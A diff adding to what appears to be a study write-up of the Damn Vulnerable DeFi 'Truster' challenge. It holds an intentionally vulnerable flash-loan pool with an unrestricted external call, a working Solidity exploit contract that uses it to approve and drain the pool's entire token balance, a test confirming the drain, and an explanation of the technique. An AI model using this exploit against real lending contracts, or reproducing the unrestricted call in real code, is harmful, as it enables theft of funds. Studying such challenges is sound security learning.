@@ -427,12 +427,95 @@ Link: https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v3.0.0/contracts
 ### Contracts
 - `src/Week10-11/TrusterLenderPool.sol`
 ```
+contract TrusterLenderPool is ReentrancyGuard {
+    using Address for address;
+
+    DamnValuableToken public immutable token;
+
+    error RepayFailed();
+
+    constructor(DamnValuableToken _token) {
+        token = _token;
+    }
+
+    function flashLoan(
+        uint256 amount,
+        address borrower,
+        address target,
+        bytes calldata data
+    )
+        external
+        nonReentrant
+        returns (bool)
+    {
+        uint256 balanceBefore = token.balanceOf(address(this));
+
+        token.transfer(borrower, amount);
+        target.functionCall(data);
+
+        if (token.balanceOf(address(this)) < balanceBefore) {
+            revert RepayFailed();
+        }
+
+        return true;
+    }
+}
+
+contract Exploit {
+    TrusterLenderPool public trusterLenderPool;
+    DamnValuableToken public dvt; //ERC20-like
+
+    constructor(TrusterLenderPool _trusterLenderPool, DamnValuableToken _dvt) {
+        trusterLenderPool = _trusterLenderPool;
+        dvt = _dvt;
+    }
+
+    function exploit() public {
+        uint256 approveAmount = 1_000_000 ether;
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), approveAmount);
+        trusterLenderPool.flashLoan(0 ether, address(this), address(dvt), data);
+        dvt.transferFrom(address(trusterLenderPool), msg.sender, approveAmount);
+    }
+}
 ```
 - `test/Week10-11/TrusterLenderPool.t.sol`
 ```
+contract TrusterLenderPoolTest is Test {
+    TrusterLenderPool pool;
+    DamnValuableToken token;
+    Exploit exploitContract;
+    address deployer;
+    address player;
+
+    function setUp() public {
+        token = new DamnValuableToken();
+        pool = new TrusterLenderPool(token);
+        assertEq(address(pool.token()), address(token));
+
+        token.transfer(address(pool), 1_000_000 * 10 ** 18);
+        assertEq(token.balanceOf(address(pool)), 1_000_000 * 10 ** 18);
+        assertEq(token.balanceOf(player), 0);
+
+        exploitContract = new Exploit(pool, token);
+    }
+
+    function testExploit() public {
+        vm.startPrank(player);
+        exploitContract.exploit();
+        _checkSolved();
+    }
+
+    function _checkSolved() internal {
+        assertEq(token.balanceOf(player), 1_000_000 * 10 ** 18);
+        assertEq(token.balanceOf(address(pool)), 0);
+    }
+}
 ```
 
 ### Exploit
+In the `flashLoan` function, `target` does not have any restriction on the addresses we can use, and so an external call can be made in the line: `target.functionCall(data)`, in which arbitrary data can be called on an arbitrary contract. In other words, we can call any function on any contract that we pass as `target` and `data`. Thus, we can encode an `approve` on the token contract to allow `Exploit` to transfer tokens from `TrusterLenderPool` to `player` who will be the msg.sender.
+
+In the `exploit` function, we encode the approve call to allow `Exploit` to move `TrusterLenderPool`'s DVT balance as `abi.encodeWithSignature("approve(address,uint256)", address(this), approveAmount);` where `address(this) == address(Exploit)` and `approveAmount == 1_000_000 ether`. When we call the `flashLoan` function, we have to pass in `amount = 0` so that we can avoid triggering the `RepayFailed` revert. The encoded function call will then be sent to the DVT contract to approve `Exploit` to call `transferFrom` on `TrusterLenderPool`. And after that, we can just transfer DVT tokens from the pool contract to `player`.
 
 ## Ethernaut: #13 Gatekeeper 1
 Link: https://ethernaut.openzeppelin.com/level/0xb5858B8EDE0030e46C0Ac1aaAedea8Fb71EF423C
